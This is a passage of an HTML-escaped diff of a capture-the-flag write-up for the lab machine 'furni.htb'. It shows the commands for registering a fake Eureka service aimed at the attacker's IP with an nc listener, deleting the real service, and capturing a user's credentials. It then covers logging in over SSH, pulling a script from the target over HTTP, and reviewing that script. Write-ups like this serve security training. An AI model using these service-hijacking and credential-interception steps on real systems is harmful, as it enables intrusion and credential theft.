+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;statusPageUrl&amp;gt;&lt;/span>http://10.10.16.91:8081/actuator/info&lt;span class="nt">&amp;lt;/statusPageUrl&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;healthCheckUrl&amp;gt;&lt;/span>http://10.10.16.91:8081/actuator/health&lt;span class="nt">&amp;lt;/healthCheckUrl&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;vipAddress&amp;gt;&lt;/span>USER-MANAGEMENT-SERVICE&lt;span class="nt">&amp;lt;/vipAddress&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;secureVipAddress&amp;gt;&lt;/span>USER-MANAGEMENT-SERVICE&lt;span class="nt">&amp;lt;/secureVipAddress&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;isCoordinatingDiscoveryServer&amp;gt;&lt;/span>false&lt;span class="nt">&amp;lt;/isCoordinatingDiscoveryServer&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;lastUpdatedTimestamp&amp;gt;&lt;/span>1745833103746&lt;span class="nt">&amp;lt;/lastUpdatedTimestamp&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;lastDirtyTimestamp&amp;gt;&lt;/span>1745833100737&lt;span class="nt">&amp;lt;/lastDirtyTimestamp&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;actionType&amp;gt;&lt;/span>ADDED&lt;span class="nt">&amp;lt;/actionType&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;/instance&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="8-register-the-fake-service">8. REGISTER THE FAKE SERVICE:&lt;/h2>
+&lt;ol>
+&lt;li>Setup the listener:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo rlwrap nc -nlvp &lt;span class="m">8081&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
+&lt;li>Register your service:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl -i -u &lt;span class="err">&amp;#39;&lt;/span>EurekaSrvr:0scarPWDisTheB3st &lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -H &lt;span class="s2">&amp;#34;Content-Type: application/xml&amp;#34;&lt;/span> &lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -d @mitm.xml &lt;span class="se">\ &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -X POST http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428213326-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="9-delete-the-original-service">9. DELETE THE ORIGINAL SERVICE:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl -i -u &lt;span class="s1">&amp;#39;EurekaSrvr:0scarPWDisTheB3st&amp;#39;&lt;/span> &lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -X DELETE &lt;span class="se">\ &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE/localhost:USER-MANAGEMENT-SERVICE:8081&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428215037-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h3 id="-check-the-listener">&amp;gt; Check The Listener:&lt;/h3>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428215508-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We see the the credentials via or MITM attack :&lt;/p>
+&lt;p>Username: &lt;strong>miranda.wise&lt;/strong>
+Password: &lt;em>IL%21veT0Be%26BeT0L0ve&lt;/em> &amp;gt; &lt;strong>IL!veT0Be&amp;amp;BeT0L0ve&lt;/strong>&lt;/p>
+&lt;p>The password has some Url Encoded characters lets decode it via python one liner:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 -c &lt;span class="s2">&amp;#34;import sys, urllib.parse; print(urllib.parse.unquote(sys.argv[1]))&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;IL%21veT0Be%26BeT0L0ve&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428220431-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="10-ssh-as-miranda-wise--usertxt">10. SSH AS MIRANDA-WISE / USER.TXT:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo ssh miranda-wise@furni.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428221032-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="11-post-enumeration">11. POST ENUMERATION:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo -l
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428231756-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>No sudo abuse.&lt;/p>
+&lt;p>Earlier via linpeas we found out that &lt;em>/opt&lt;/em> has interesting files which were:&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428232251-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We couldn&amp;rsquo;t still access the script directory and heapdump neither heapdump.
+So lets download the &lt;strong>log_analyse.sh&lt;/strong> file&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#/ON-TARGET/#&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cp /opt/log_analyse.sh .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 -m http.server &lt;span class="m">1234&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#/ON-KALI/#&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -O http://10.10.11.66:1234/log_analyse.sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Lets review the code:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/bin/bash&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Colors&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">GREEN&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\033&lt;/span>&lt;span class="s1">[0;32m&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">RED&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\033&lt;/span>&lt;span class="s1">[0;31m&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">YELLOW&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\033&lt;/span>&lt;span class="s1">[1;33m&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">BLUE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\033&lt;/span>&lt;span class="s1">[0;34m&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">CYAN&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\033&lt;/span>&lt;span class="s1">[0;36m&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">RESET&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\033&lt;/span>&lt;span class="s1">[0m&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">LOG_FILE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">OUTPUT_FILE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;log_analysis.txt&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">declare&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">A&lt;/span> &lt;span class="n">successful_users&lt;/span> &lt;span class="c1"># Associative array: username -&amp;gt; count&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">declare&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">A&lt;/span> &lt;span class="n">failed_users&lt;/span> &lt;span class="c1"># Associative array: username -&amp;gt; count&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">STATUS_CODES&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;200:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;201:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;302:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;400:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;401:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;403:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;404:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;500:0&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># Indexed array: &amp;#34;code:count&amp;#34; pairs&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="err">!&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">f&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span> &lt;span class="p">];&lt;/span> &lt;span class="n">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{RED}&lt;/span>&lt;span class="s2">Error: Log file $LOG_FILE not found.$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">analyze_logins&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Process successful logins&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="n">IFS&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">read&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">r&lt;/span> &lt;span class="n">line&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">username&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$line&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">awk&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="sa">F&lt;/span>&lt;span class="s2">&amp;#34;&amp;#39;&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;{print $2}&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">n&lt;/span> &lt;span class="s2">&amp;#34;${successful_users[$username]+_}&amp;#34;&lt;/span> &lt;span class="p">];&lt;/span> &lt;span class="n">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">successful_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">successful_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">successful_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">grep&lt;/span> &lt;span class="s2">&amp;#34;LoginSuccessLogger&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Process failed logins&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="n">IFS&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">read&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">r&lt;/span> &lt;span class="n">line&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">username&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$line&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">awk&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="sa">F&lt;/span>&lt;span class="s2">&amp;#34;&amp;#39;&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;{print $2}&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">n&lt;/span> &lt;span class="s2">&amp;#34;${failed_users[$username]+_}&amp;#34;&lt;/span> &lt;span class="p">];&lt;/span> &lt;span class="n">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">failed_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">failed_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">failed_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">grep&lt;/span> &lt;span class="s2">&amp;#34;LoginFailureLogger&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">analyze_http_statuses&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Process HTTP status codes&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="n">IFS&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">read&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">r&lt;/span> &lt;span class="n">line&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">code&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$line&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">oP&lt;/span> &lt;span class="s1">&amp;#39;Status: \K.*&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">found&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Check if code exists in STATUS_CODES array&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="s2">&amp;#34;${!STATUS_CODES[@]}&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">existing_entry&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{STATUS_CODES[$i]}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">existing_code&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$existing_entry&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">cut&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">f1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">existing_count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$existing_entry&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">cut&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">f2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">[[&lt;/span> &lt;span class="s2">&amp;#34;$existing_code&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">eq&lt;/span> &lt;span class="s2">&amp;#34;$code&amp;#34;&lt;/span> &lt;span class="p">]];&lt;/span> &lt;span class="n">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">new_count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">existing_count&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">STATUS_CODES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{existing_code}&lt;/span>&lt;span class="s2">:$&lt;/span>&lt;span class="si">{new_count}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">grep&lt;/span> &lt;span class="s2">&amp;#34;HTTP.*Status: &amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">analyze_log_errors&lt;/span>&lt;span class="p">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Log Level Counts (colored)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{YELLOW}&lt;/span>&lt;span class="s2">[+] Log Level Counts:$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">log_levels&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">oP&lt;/span> &lt;span class="s1">&amp;#39;(?&amp;lt;=Z )\w+&amp;#39;&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">sort&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$log_levels&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">awk&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">blue&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$BLUE&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">yellow&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$YELLOW&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">red&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$RED&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">reset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$RESET&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;{&lt;/span>
